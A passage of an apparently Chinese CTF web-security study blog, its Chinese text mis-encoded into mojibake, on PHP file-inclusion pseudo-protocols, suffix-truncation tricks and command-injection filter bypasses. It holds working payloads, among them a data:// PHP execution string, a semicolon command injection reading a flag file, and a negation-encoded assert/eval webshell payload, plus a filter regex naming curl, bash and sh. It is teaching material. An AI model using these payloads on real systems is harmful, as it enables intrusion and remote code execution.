â€œphpinfo();â€ <span class="string">|grep php.ini</span></span><br></pre></td></tr></table></figure></blockquote><h4 id="4-file-x2F-x2F-ä¼ªåè®®ï¼ˆè¯»å–æ–‡ä»¶å†…å®¹ï¼‰"><a href="#4-file-x2F-x2F-ä¼ªåè®®ï¼ˆè¯»å–æ–‡ä»¶å†…å®¹ï¼‰" class="headerlink" title="4.file:&#x2F;&#x2F;ä¼ªåè®®ï¼ˆè¯»å–æ–‡ä»¶å†…å®¹ï¼‰"></a>4.file:&#x2F;&#x2F;ä¼ªåè®®ï¼ˆè¯»å–æ–‡ä»¶å†…å®¹ï¼‰</h4><p>   <strong>Â·æ¡ä»¶</strong></p><figure class="highlight ini"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">allow_url_fopen</span>=<span class="literal">on</span>/<span class="literal">off</span></span><br><span class="line"><span class="attr">allow_url_include</span>=<span class="literal">on</span>/<span class="literal">off</span> ï¼ˆå‡ä¸å—å½±å“ï¼‰</span><br></pre></td></tr></table></figure><p>æ‰“<code>ctf</code>ä¸­å¸¸ç”¨äºè¯»å–æœ¬åœ°æ–‡ä»¶</p><figure class="highlight delphi"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?<span class="keyword">file</span>=<span class="keyword">file</span>:<span class="comment">//C:\Windows\System32\drivers\etc\hosts</span></span><br></pre></td></tr></table></figure><p><img src="https://img-blog.csdnimg.cn/1f9a0a4e11564da38bf19a9e83d3fb44.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBA5LmU5rK7Nzc3,size_20,color_FFFFFF,t_70,g_se,x_16" alt="https://img-blog.csdnimg.cn/1f9a0a4e11564da38bf19a9e83d3fb44.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBA5LmU5rK7Nzc3,size_20,color_FFFFFF,t_70,g_se,x_16"></p><h4 id="5-phar-x2F-x2F-ä¼ªåè®®-è¯»å–å‹ç¼©åŒ…æ–‡ä»¶å†…å®¹"><a href="#5-phar-x2F-x2F-ä¼ªåè®®-è¯»å–å‹ç¼©åŒ…æ–‡ä»¶å†…å®¹" class="headerlink" title="5.phar:&#x2F;&#x2F;ä¼ªåè®®(è¯»å–å‹ç¼©åŒ…æ–‡ä»¶å†…å®¹)"></a>5.phar:&#x2F;&#x2F;ä¼ªåè®®(è¯»å–å‹ç¼©åŒ…æ–‡ä»¶å†…å®¹)</h4><p><strong>Â·æ¡ä»¶</strong></p><figure class="highlight vbnet"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="symbol">allow_url_fopen:</span> <span class="keyword">off</span>/<span class="keyword">on</span></span><br><span class="line"><span class="symbol">allow_url_include:</span> <span class="keyword">off</span>/<span class="keyword">on</span> (å‡ä¸å—å½±å“)</span><br></pre></td></tr></table></figure><p><code>æ³¨</code>ï¼š</p><blockquote><p>php ç‰ˆæœ¬å¤§äºç­‰äº<code>5.3.0</code>ï¼Œå‹ç¼©åŒ…éœ€è¦æ˜¯<code>zip</code>åè®®å‹ç¼©ï¼Œ<code>rar</code>ä¸è¡Œï¼Œå°†æœ¨é©¬æ–‡ä»¶å‹ç¼©åï¼Œæ”¹ä¸ºå…¶ä»–ä»»æ„æ ¼å¼çš„æ–‡ä»¶éƒ½å¯ä»¥æ­£å¸¸ä½¿ç”¨ã€‚</p></blockquote><p><strong>Â·æ ¼å¼</strong></p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?file=phar:<span class="regexp">//</span>å‹ç¼©åŒ…å/å†…éƒ¨æ–‡ä»¶å</span><br></pre></td></tr></table></figure><p>ä¾‹ï¼Œ</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">phar:<span class="regexp">//</span>x.zip/x.php</span><br></pre></td></tr></table></figure><h4 id="6-zip-x2F-x2F-ä¼ªåè®®"><a href="#6-zip-x2F-x2F-ä¼ªåè®®" class="headerlink" title="6.zip:&#x2F;&#x2F;ä¼ªåè®®"></a>6.zip:&#x2F;&#x2F;ä¼ªåè®®</h4><blockquote><p>zipä¼ªåè®®å’Œpharåè®®ç±»ä¼¼ï¼Œä½†æ˜¯ç”¨æ³•ä¸ä¸€æ ·ï¼ˆurlä¸åŒï¼‰</p></blockquote><p><strong>Â·æ¡ä»¶</strong></p><figure class="highlight vbnet"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="symbol">allow_url_fopen:</span> <span class="keyword">off</span>/<span class="keyword">on</span></span><br><span class="line"><span class="symbol">allow_url_include:</span> <span class="keyword">off</span>/<span class="keyword">on</span> (å‡ä¸å—å½±å“)</span><br></pre></td></tr></table></figure><p><strong>Â·æ ¼å¼</strong></p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?file=zip:<span class="regexp">//</span>[å‹ç¼©æ–‡ä»¶ç»å¯¹è·¯å¾„]<span class="comment">#[å‹ç¼©æ–‡ä»¶å†…çš„å­æ–‡ä»¶å]</span></span><br></pre></td></tr></table></figure><p>ä¾‹ï¼Œ</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">zip:<span class="regexp">//</span>D:\phpstudy\WWW\x.zip%<span class="number">23</span>shell.php       <span class="comment">#-&gt;%23</span></span><br></pre></td></tr></table></figure><h4 id="7-data-x2F-x2F-ä¼ªåè®®-è¯»å–æ–‡ä»¶"><a href="#7-data-x2F-x2F-ä¼ªåè®®-è¯»å–æ–‡ä»¶" class="headerlink" title="7.data:&#x2F;&#x2F;ä¼ªåè®®(è¯»å–æ–‡ä»¶)"></a>7.data:&#x2F;&#x2F;ä¼ªåè®®(è¯»å–æ–‡ä»¶)</h4><blockquote><p>ï¼ˆå¯ä»¥ç›´æ¥è¾¾åˆ°æ‰§è¡Œphpä»£ç çš„æ•ˆæœï¼‰<br>å’Œ<code>php://input</code>å¾ˆåƒï¼Œ<code>php://input</code>ä»¥<code>post</code>æäº¤æ•°æ®é‚£æ ·æäº¤æ•°æ®ï¼Œ<br><code>data://</code>æ˜¯ä»¥<code>get</code>æ–¹å¼æäº¤æ•°æ®ï¼Œä¹Ÿæ˜¯å¯ä»¥æ‰§è¡Œæäº¤çš„è„šæœ¬</p></blockquote><p><strong>Â·æ ¼å¼</strong></p><blockquote><figure class="highlight php-template"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="language-xml">?file=data://text/plain,</span><span class="language-php"><span class="meta">&lt;?php</span>%<span class="number">20</span>phpinfo()<span class="meta">?&gt;</span></span></span><br></pre></td></tr></table></figure><p>å¦‚æœå¯¹ç‰¹æ®Šå­—ç¬¦è¿›è¡Œäº†è¿‡æ»¤ï¼Œå¯ä»¥é€šè¿‡base64ç¼–ç åå†è¾“å…¥</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">data://text/plain;<span class="built_in">base64</span>,<span class="built_in">base64</span>åŠ å¯†çš„ä»£ç </span><br></pre></td></tr></table></figure><p>å¯é…åˆ<a href="https://www.cnblogs.com/xiaozi/p/7831529.html">phpå‘½ä»¤æ‰§è¡Œæ¼æ´</a>ï¼Œå®ç°å¯¹ä¸€äº›æ•°æ®çš„è·å–<br>å¦‚ï¼š<code>&lt;?php system(&quot;ls&quot;)?&gt;</code></p></blockquote><h4 id="8-æ€»ç»“"><a href="#8-æ€»ç»“" class="headerlink" title="8.æ€»ç»“"></a>8.æ€»ç»“</h4><blockquote><p><a href="https://blog.csdn.net/dreamthe/article/details/121765876">å‚è€ƒå®ä¾‹1</a></p><p><a href="https://blog.csdn.net/qq_41617034/article/details/106658417">å‚è€ƒå®ä¾‹2</a></p></blockquote><h3 id="3-ç»•è¿‡"><a href="#3-ç»•è¿‡" class="headerlink" title="3.ç»•è¿‡"></a>3.ç»•è¿‡</h3><h4 id="1ï¼‰è·¯å¾„é•¿åº¦ç»•è¿‡åç¼€"><a href="#1ï¼‰è·¯å¾„é•¿åº¦ç»•è¿‡åç¼€" class="headerlink" title="1ï¼‰è·¯å¾„é•¿åº¦ç»•è¿‡åç¼€"></a>1ï¼‰è·¯å¾„é•¿åº¦ç»•è¿‡åç¼€</h4><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">$a=@$_GET[<span class="string">&#x27;123&#x27;</span>];</span><br><span class="line"><span class="title function_">include</span>($a.<span class="string">&#x27;.html&#x27;</span>);</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><p>å¦‚æœé™åˆ¶äº†æ–‡ä»¶ç±»å‹ï¼Œæ¯”å¦‚è¿™é‡Œåªèƒ½åŒ…å«<code>html</code>åç¼€çš„æ–‡ä»¶ï¼Œé‚£ä¹ˆå°±å¯ä»¥ä½¿ç”¨æ­¤æ–¹æ³•</p><p><code>æ“ä½œç³»ç»Ÿå­˜åœ¨æœ€å¤§è·¯å¾„é•¿åº¦çš„é™åˆ¶</code></p><blockquote><p>windowsç³»ç»Ÿï¼Œæ–‡ä»¶åæœ€é•¿256ä¸ªå­—ç¬¦</p><p>linuxç³»ç»Ÿï¼Œæ–‡ä»¶åæœ€é•¿4096ä¸ªå­—ç¬¦(æµè§ˆå™¨æœ€å¤šåªèƒ½è¾“å…¥300å¤šä¸ªå­—ç¬¦ï¼Œæ‰€ä»¥éœ€è¦æŠ“åŒ…)<br>å‰é¢åŠ .&#x2F;.&#x2F;.&#x2F;.&#x2F;â€¦â€¦â€¦â€¦xx.php</p></blockquote><p>å¯ä»¥è¾“å…¥è¶…è¿‡æœ€å¤§è·¯å¾„é•¿åº¦çš„ç›®å½•ï¼Œè¿™æ ·ç³»ç»Ÿå°±ä¼šå°†åé¢çš„è·¯å¾„ä¸¢å¼ƒï¼Œ<code>å¯¼è‡´æ‰©å±•åè¢«ä¸­é€”æˆªæ–­</code></p><p>åœ¨æ–‡ä»¶åé¢åŠ <code>.</code> å¦‚ï¼š </p><blockquote><p>info.phpâ€¦â€¦â€¦â€¦â€¦â€¦â€¦â€¦â€¦â€¦â€¦â€¦â€¦â€¦â€¦â€¦â€¦â€¦â€¦â€¦â€¦â€¦â€¦â€¦â€¦â€¦â€¦â€¦â€¦â€¦â€¦â€¦â€¦â€¦â€¦â€¦â€¦â€¦â€¦â€¦â€¦â€¦â€¦â€¦â€¦â€¦â€¦â€¦â€¦â€¦â€¦â€¦â€¦â€¦â€¦â€¦â€¦â€¦â€¦â€¦â€¦â€¦â€¦â€¦â€¦â€¦â€¦â€¦â€¦â€¦â€¦â€¦â€¦â€¦â€¦â€¦â€¦â€¦â€¦â€¦â€¦â€¦â€¦â€¦â€¦â€¦â€¦â€¦â€¦â€¦â€¦â€¦â€¦â€¦.html&#96;</p><p><code>.</code>è¶…è¿‡256ä¸ªå°±è¡Œï¼Œåé¢å¤šå‡ºæ¥çš„<code>...........................................html</code>ä¸ä¼šè¢«è¯†åˆ«åˆ°</p></blockquote><h4 id="2ï¼‰-æˆªæ–­åç¼€"><a href="#2ï¼‰-æˆªæ–­åç¼€" class="headerlink" title="2ï¼‰? æˆªæ–­åç¼€"></a>2ï¼‰? æˆªæ–­åç¼€</h4><p>å¾€å¾€æ–‡ä»¶åŒ…å«ä¸­ä¼šå‡ºç°</p><blockquote><p><code>(&quot;$file&quot;.&quot;.html&quot;)</code><br>è¿™é‡Œä»¥htmlä¸ºä¾‹å­ï¼Œè¿™æ ·æˆ‘ä»¬è¾“å…¥çš„æ–‡ä»¶åç§°å‚æ•°åé¢ç»ˆä¼šè·Ÿä¸Š.htmlåç¼€ï¼Œä»è€Œå¯¼è‡´æ–‡ä»¶åŒ…å«å¤±è´¥</p><p>è¦æˆªæ–­åç¼€ï¼Œåªéœ€è¦åœ¨æœ«å°¾æ·»åŠ  <code>?</code> å³å¯ï¼Œè¿™æ ·åç¼€å°±ä¼šå˜æˆ URL çš„å‚æ•°</p></blockquote><hr><h2 id="å…«ã€logic-loophole"><a href="#å…«ã€logic-loophole" class="headerlink" title="å…«ã€logic loophole"></a>å…«ã€logic loophole</h2><blockquote><p>ä¸€èˆ¬åœ¨æ”¯ä»˜è´­ä¹°å¤„ä»£ç ï¼Œå¯¹æ•°æ®å¤„ç†å‡ºç°é€»è¾‘é”™è¯¯ï¼Œå¯¹ç”¨æˆ·è¾“å…¥çš„æ•°æ®æ²¡æœ‰è¿›è¡Œä¸¥æ ¼å®¡æŸ¥ï¼Œå¯¼è‡´é€»è¾‘æ¼æ´ï¼Œä½¿å¾—ç”¨æˆ·è·å–ä¸å±äºä»–çš„æƒé™æˆ–è€…ä¿¡æ¯å†…å®¹</p></blockquote><hr><h2 id="ä¹ã€command-execution"><a href="#ä¹ã€command-execution" class="headerlink" title="ä¹ã€command execution"></a>ä¹ã€command execution</h2><h3 id="1-æœ‰å…³å‘½ä»¤æ‰§è¡Œçš„çŸ¥è¯†ï¼ˆwindows-æˆ–-linux-ä¸‹ï¼‰"><a href="#1-æœ‰å…³å‘½ä»¤æ‰§è¡Œçš„çŸ¥è¯†ï¼ˆwindows-æˆ–-linux-ä¸‹ï¼‰" class="headerlink" title="1.æœ‰å…³å‘½ä»¤æ‰§è¡Œçš„çŸ¥è¯†ï¼ˆwindows æˆ– linux ä¸‹ï¼‰:"></a>1.æœ‰å…³å‘½ä»¤æ‰§è¡Œçš„çŸ¥è¯†ï¼ˆwindows æˆ– linux ä¸‹ï¼‰:</h3><blockquote><p><code>1ï¼‰command1 ; command2 ç”¨;éš”å¼€è¡¨ç¤ºä¸ºå¤šä¸ªå‘½ä»¤ï¼Œå‘½ä»¤æŒ‰ç…§ä»å·¦åˆ°å³çš„é¡ºåºæ‰§è¡Œï¼Œå½¼æ­¤æ— å…³è”ï¼Œæ‰€æœ‰çš„å‘½ä»¤éƒ½ä¼šæ‰§è¡Œã€‚å…ˆæ‰§è¡Œ command1 åæ‰§è¡Œ command2</code></p><p><code>2ï¼‰command1 &amp;&amp; command2 å…ˆæ‰§è¡Œ command1ï¼Œå¦‚æœä¸ºçœŸï¼Œå†æ‰§è¡Œ command2</code></p><p><code>3ï¼‰command1 | command2 å°†ä¸¤ä¸ªå‘½ä»¤åˆ†å¼€ï¼Œå·¦è¾¹å‘½ä»¤çš„è¾“å‡ºä½œä¸ºå³è¾¹å‘½ä»¤çš„è¾“å…¥ï¼Œåªæ‰§è¡Œ command2</code></p><p><code>4ï¼‰command1 &amp; command2 &amp;è¡¨ç¤ºä»»åŠ¡åå°æ‰§è¡Œï¼Œä¸nohupå‘½ä»¤åŠŸèƒ½å·®ä¸å¤šï¼Œå…ˆæ‰§è¡Œ command2 åæ‰§è¡Œ command1</code></p><p><code>5ï¼‰command1 || command2 å…ˆæ‰§è¡Œ command1ï¼Œå¦‚æœä¸ºå‡ï¼Œå†æ‰§è¡Œ command2</code></p><p><code>å‘½ä»¤æ‰§è¡Œæ¼æ´ï¼ˆ| || &amp; &amp;&amp; ç§°ä¸º ç®¡é“ç¬¦ï¼‰</code></p></blockquote><p>eg:</p><p><code>find  / -name &quot;flag* &quot;</code><br>åœ¨å½“å‰ç›®å½•åŠå…¶å­ç›®å½•ä¸‹æŸ¥æ‰¾æ–‡ä»¶åä¸­åŒ…å«<code>flag</code>çš„æ–‡ä»¶<br><code>find  / -name &quot; *.txt&quot;</code><br>åœ¨å½“å‰ç›®å½•åŠå…¶å­ç›®å½•ä¸‹æŸ¥æ‰¾åç¼€ä¸º<code>txt</code>çš„æ–‡ä»¶</p><h3 id="ç»•è¿‡è¿‡æ»¤"><a href="#ç»•è¿‡è¿‡æ»¤" class="headerlink" title="ç»•è¿‡è¿‡æ»¤"></a>ç»•è¿‡è¿‡æ»¤</h3><h4 id="1-è¿‡æ»¤cat"><a href="#1-è¿‡æ»¤cat" class="headerlink" title="1.è¿‡æ»¤cat"></a>1.è¿‡æ»¤cat</h4><blockquote><p><code>moreï¼Œlessï¼Œheadï¼Œtac</code>éƒ½å¯ä»¥å¯¹æ–‡æœ¬è¿›è¡Œè¯»å–</p></blockquote><h4 id="2-è¿‡æ»¤ç©ºæ ¼"><a href="#2-è¿‡æ»¤ç©ºæ ¼" class="headerlink" title="2.è¿‡æ»¤ç©ºæ ¼"></a>2.è¿‡æ»¤ç©ºæ ¼</h4><blockquote><p><code>IFS$9ã€%09ã€&lt;ã€&gt;ã€&lt;&gt;ã€&#123;,&#125;ã€%20ã€$&#123;IFS&#125;ã€$&#123;IFS&#125;</code>æ¥ä»£æ›¿ç©ºæ ¼</p></blockquote><blockquote><p><code>&lt;,&gt;</code>æ˜¯æŠŠå†…å®¹å¯¼å‘æŸä¸ªåœ°æ–¹ï¼Œå¯ä»¥æ˜¯æ–‡ä»¶ï¼Œä¹Ÿå¯ä»¥æ˜¯å‘½ä»¤</p><p>å¦‚<code>cat&lt;flag.php</code>å°±æ˜¯ç›¸å½“äºï¼ŒæŠŠflag.phpå†…å®¹ç”¨catå‘½ä»¤æ˜¾ç¤ºå‡ºæ¥</p><p><code>%09</code>æ˜¯tabé”®ï¼Œå¯ä»¥è¡¥å…¨å†…å®¹</p><p>æ¯”å¦‚è¿‡æ»¤äº†flagï¼Œä½†æ˜¯éœ€è¦è®¿é—®<code>flag233.php</code></p><p>é‚£ä¹ˆå°±å¯ä»¥<code>cat %09*233.php</code>ï¼Œå°±å¯ä»¥äº†</p></blockquote><h4 id="3-è¿‡æ»¤ç›®å½•åˆ†éš”ç¬¦"><a href="#3-è¿‡æ»¤ç›®å½•åˆ†éš”ç¬¦" class="headerlink" title="3.è¿‡æ»¤ç›®å½•åˆ†éš”ç¬¦"></a>3.è¿‡æ»¤ç›®å½•åˆ†éš”ç¬¦</h4><blockquote><p>ä¹Ÿå°±æ˜¯&#x2F;ä¸èƒ½ç”¨äº†ï¼Œä¸èƒ½ç›´æ¥æŸ¥çœ‹æ–‡ä»¶ç›®å½•</p><p><code>cat /flag_is_here/flag_9012297169124.php</code></p><p>å¯ä»¥<strong>åˆ©ç”¨åˆ†å·ä½¿ä¸¤ä¸ªå‘½ä»¤åŒæ—¶è¿›è¡Œ</strong>ä¹Ÿå°±æ˜¯</p><p><code>127.0.0.1;cd flag_is_here;cat flag_9012297169124.php</code></p></blockquote><h4 id="4-è¿‡æ»¤è¿ç®—ç¬¦"><a href="#4-è¿‡æ»¤è¿ç®—ç¬¦" class="headerlink" title="4.è¿‡æ»¤è¿ç®—ç¬¦"></a>4.è¿‡æ»¤è¿ç®—ç¬¦</h4><p>å¯ä»¥ç”¨<code>;</code>ä»£æ›¿ç®¡é“è¿ç®—ç¬¦</p><h4 id="5-ç»•è¿‡æ­£åˆ™åŒ¹é…"><a href="#5-ç»•è¿‡æ­£åˆ™åŒ¹é…" class="headerlink" title="5.ç»•è¿‡æ­£åˆ™åŒ¹é…"></a>5.ç»•è¿‡æ­£åˆ™åŒ¹é…</h4><p>æ¯”å¦‚</p><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="title">if</span><span class="params">(preg_match(<span class="string">&quot;/[A-Za-z0-9]+/&quot;</span>,<span class="variable">$code</span>)</span></span>)</span><br></pre></td></tr></table></figure><p><code>æ‰€æœ‰å¤§å°å†™å­—æ¯å’Œæ•°å­—éƒ½è¢«æ­£åˆ™åŒ¹é…è¿‡æ»¤</code></p><p>è¿™é‡Œå°±éœ€è¦</p><h5 id="æ³•1ï¼šå–åç»•è¿‡ï¼š"><a href="#æ³•1ï¼šå–åç»•è¿‡ï¼š" class="headerlink" title="æ³•1ï¼šå–åç»•è¿‡ï¼š"></a>æ³•1ï¼šå–åç»•è¿‡ï¼š</h5><p><u><strong>å–å</strong>å°±æ˜¯å°†æ•°å­—è½¬åŒ–ä¸ºäºŒè¿›åˆ¶,å†æŠŠäºŒè¿›åˆ¶ä¸­çš„1å˜æˆ0,0å˜æˆ1</u></p><p><code>~</code>æ˜¯å–åç¬¦å·ï¼Œ</p><figure class="highlight mel"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">echo urlencode(~<span class="string">&#x27;assert&#x27;</span>);</span><br><span class="line">echo urlencode(~<span class="string">&#x27;eval($_REQUEST[8])&#x27;</span>);</span><br><span class="line">?&gt;</span><br><span class="line"></span><br><span class="line">ç»“æœï¼š</span><br><span class="line">%9E%8C%8C%9A%8D%8B</span><br><span class="line">%9A%89%9E%93%D7%DB%A0%AD%BA%AE%AA%BA%AC%AB%A4%C7%A2%D6</span><br></pre></td></tr></table></figure><blockquote><p>phpæ–­è¨€ï¼šassert â€” æ£€æŸ¥ä¸€ä¸ªæ–­è¨€æ˜¯å¦ä¸º falseï¼Œå¦‚æœå‚æ•°æ˜¯å­—ç¬¦ä¸²ï¼Œå®ƒå°†ä¼šè¢« assert() å½“åš PHP ä»£ç æ¥æ‰§è¡Œ</p></blockquote><p>ç„¶åå†èµ‹å€¼</p><figure class="highlight llvm"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?code<span class="operator">=</span>(~<span class="variable">%9</span>E<span class="variable">%8</span>C<span class="variable">%8</span>C<span class="variable">%9</span>A<span class="variable">%8</span>D<span class="variable">%8</span>B)(~<span class="variable">%9</span>A<span class="variable">%89</span><span class="variable">%9</span>E<span class="variable">%93</span><span class="variable">%D7</span><span class="variable">%DB</span><span class="variable">%A0</span><span class="variable">%AD</span><span class="variable">%BA</span><span class="variable">%AE</span><span class="variable">%AA</span><span class="variable">%BA</span><span class="variable">%AC</span><span class="variable">%AB</span><span class="variable">%A4</span><span class="variable">%C7</span><span class="variable">%A2</span><span class="variable">%D6</span>)<span class="comment">;</span></span><br></pre></td></tr></table></figure><blockquote><p>æ³¨æ„åé¢è¦æœ‰<code>;</code>ä»£è¡¨phpä»£ç ç»“æŸ<br>è¿™é‡Œ~æ˜¯å–åï¼Œä¹‹å‰urlencodeé‡Œå–åäº†ä¸€æ¬¡ï¼Œèµ‹å€¼æ—¶å†å–åä¸€æ¬¡ï¼Œç›¸å½“äºæ²¡æœ‰å–å<br>ç­‰åŒäº</p><figure class="highlight armasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?<span class="meta">code</span>=(<span class="meta">assert</span>)(eval($_REQUEST[<span class="number">8</span>]))</span><br></pre></td></tr></table></figure><p>(assert)å› ä¸ºæ˜¯assertæ˜¯å‡½æ•°ï¼Œè¢«å½“ä½œå‡½æ•°æ‰§è¡Œï¼Œäºæ˜¯å› ä¸º<code>æ–­è¨€(eval($_REQUEST[8]))</code>ï¼Œæ‰€ä»¥æŠŠ<code>eval($_REQUEST[8])</code>å½“ä½œ<code>php</code>æ‰§è¡Œï¼Œäºæ˜¯å°±å¯ä»¥æ‹¿åˆ°<code>shell</code>äº†</p></blockquote><p>èšå‰‘è¿æ¥</p><figure class="highlight llvm"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="symbol">http:</span>//url?code<span class="operator">=</span>(~<span class="variable">%9</span>E<span class="variable">%8</span>C<span class="variable">%8</span>C<span class="variable">%9</span>A<span class="variable">%8</span>D<span class="variable">%8</span>B)(~<span class="variable">%9</span>A<span class="variable">%89</span><span class="variable">%9</span>E<span class="variable">%93</span><span class="variable">%D7</span><span class="variable">%DB</span><span class="variable">%A0</span><span class="variable">%AD</span><span class="variable">%BA</span><span class="variable">%AE</span><span class="variable">%AA</span><span class="variable">%BA</span><span class="variable">%AC</span><span class="variable">%AB</span><span class="variable">%A4</span><span class="variable">%C7</span><span class="variable">%A2</span><span class="variable">%D6</span>)<span class="comment">;</span></span><br></pre></td></tr></table></figure><h5 id="æ³•2ï¼šå¼‚æˆ–ç»•è¿‡"><a href="#æ³•2ï¼šå¼‚æˆ–ç»•è¿‡" class="headerlink" title="æ³•2ï¼šå¼‚æˆ–ç»•è¿‡:"></a>æ³•2ï¼šå¼‚æˆ–ç»•è¿‡:</h5><p>åœ¨PHPä¸­ä¸¤ä¸ªå­—ç¬¦ä¸²å¼‚æˆ–ä¹‹åï¼Œå¾—åˆ°çš„è¿˜æ˜¯ä¸€ä¸ªå­—ç¬¦ä¸²ã€‚<br> ä¾‹å¦‚ï¼šå¼‚æˆ– <code>?</code> å’Œ <code>~</code> ä¹‹åå¾—åˆ°çš„æ˜¯ <code>A</code></p><blockquote><p>å­—ç¬¦ï¼š?         ASCIIç ï¼š63           äºŒè¿›åˆ¶ï¼š  00â€­11 1111â€¬<br>å­—ç¬¦ï¼š~         ASCIIç ï¼š126          äºŒè¿›åˆ¶ï¼š  0111 1110â€¬<br>å¼‚æˆ–è§„åˆ™ï¼š<br>1   XOR   0   &#x3D;   1<br>0   XOR   1   &#x3D;   1<br>0   XOR   0   &#x3D;   0<br>1   XOR   1   &#x3D;   0<br>ä¸Šè¿°ä¸¤ä¸ªå­—ç¬¦å¼‚æˆ–å¾—åˆ° äºŒè¿›åˆ¶ï¼š  0100 0001<br>è¯¥äºŒè¿›åˆ¶çš„åè¿›åˆ¶ä¹Ÿå°±æ˜¯ï¼š65<br>å¯¹åº”çš„ASCIIç æ˜¯ï¼šA</p></blockquote><p>æœ¬é¢˜preg_replace()è¿‡æ»¤äº†<code>æ‰€æœ‰è‹±æ–‡å­—æ¯å’Œæ•°å­—</code>ï¼Œä½†æ˜¯<em>ASCIIç ä¸­è¿˜æœ‰å¾ˆå¤š<code>å­—æ¯æ•°å­—ä¹‹å¤–çš„å­—ç¬¦</code>ï¼Œåˆ©ç”¨è¿™äº›å­—ç¬¦è¿›è¡Œå¼‚æˆ–å¯ä»¥å¾—åˆ°æˆ‘ä»¬æƒ³è¦çš„å­—ç¬¦</em></p><blockquote><p>PSï¼šå–ASCIIè¡¨ç§éå­—æ¯æ•°å­—çš„å…¶ä»–å­—ç¬¦ï¼Œè¦æ³¨æ„æœ‰äº›å­—ç¬¦å¯èƒ½ä¼šå½±å“æ•´ä¸ªè¯­å¥æ‰§è¡Œï¼Œæ‰€ä»¥è¦å»æ‰å¦‚ï¼šåå¼•å·ï¼Œå•å¼•å·</p></blockquote><h5 id="æ³•3ï¼šåæ–œæ -è½¬ä¹‰ç»•è¿‡"><a href="#æ³•3ï¼šåæ–œæ -è½¬ä¹‰ç»•è¿‡" class="headerlink" title="æ³•3ï¼šåæ–œæ \è½¬ä¹‰ç»•è¿‡"></a>æ³•3ï¼šåæ–œæ \è½¬ä¹‰ç»•è¿‡</h5><p>å¯¹äº</p><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="title">if</span><span class="params">(preg_match(<span class="string">&quot;/ls|tee|head|wegt|nl|vi|vim|file|sh|dir|cat|more|less|tar|mv|cp|wegt|php|sort|echo|bash|curl|uniq|rev|\&quot;|\&#x27;| |\/|&lt;|&gt;|\\|/i&quot;</span>, <span class="variable">$ip</span>,<span class="variable">$match</span>)</span></span>)</span><br></pre></td></tr></table></figure><blockquote><p>åœ¨è¿™ä¸ªæ­£åˆ™åŒ¹é…ä¸­å¹¶æ²¡æœ‰è¿‡æ»¤åæ–œæ <code>\</code></p><p>æ‰€ä»¥è™½ç„¶æˆ‘ä»¬æ‰§è¡Œ<code>ls</code>ä¹‹ç±»ä¼šè¢«è¿‡æ»¤ï¼Œä½†æ˜¯æ‰§è¡Œ<code>l\s</code>æ—¶ï¼Œä¼šç»•è¿‡<code>ls</code>çš„åŒ¹é…ï¼Œä½†æ˜¯ä»ç„¶èƒ½å®ç°<code>ls</code>çš„åŠŸèƒ½</p><p>å¯¹äºæ–‡ä»¶åæ¯”å¦‚<code>php</code>è¿‡æ»¤ï¼Œä¹Ÿå¯ä»¥ç”¨åä¹‰å­—ç¬¦<code>p\ph</code>ï¼ŒåŒæ ·ä¹Ÿå¯ä»¥ç»•è¿‡</p></blockquote><h4 id="6-ç»•è¿‡é•¿åº¦é™åˆ¶"><a href="#6-ç»•è¿‡é•¿åº¦é™åˆ¶" class="headerlink" title="6.ç»•è¿‡é•¿åº¦é™åˆ¶"></a>6.ç»•è¿‡é•¿åº¦é™åˆ¶</h4><p><code>&gt;</code>å’Œ<code>&gt;&gt;</code>ä¸¤ä¸ªç¬¦å·çš„ä½¿ç”¨</p><blockquote><p>ä½¿ç”¨<code>&gt;</code>å‘½ä»¤ä¼šå°†åŸæœ‰æ–‡ä»¶å†…å®¹è¦†ç›–ï¼Œå¦‚æœæ˜¯å­˜å…¥ä¸å­˜åœ¨çš„æ–‡ä»¶åï¼Œé‚£ä¹ˆå°±ä¼šæ–°å»ºæ–‡ä»¶å†å­˜å…¥</p></blockquote><p><img src="/2022/05/28/Web-study/image-20220926223728694.png" alt="image-20220926223728694"></p><blockquote><p><code>&gt;&gt;</code>ç¬¦å·çš„ä½œç”¨æ˜¯å°†å­—ç¬¦ä¸²æ·»åŠ åˆ°æ–‡ä»¶å†…å®¹æœ«å°¾ï¼Œä¸ä¼šè¦†ç›–åŸå†…å®¹</p></blockquote><p><img 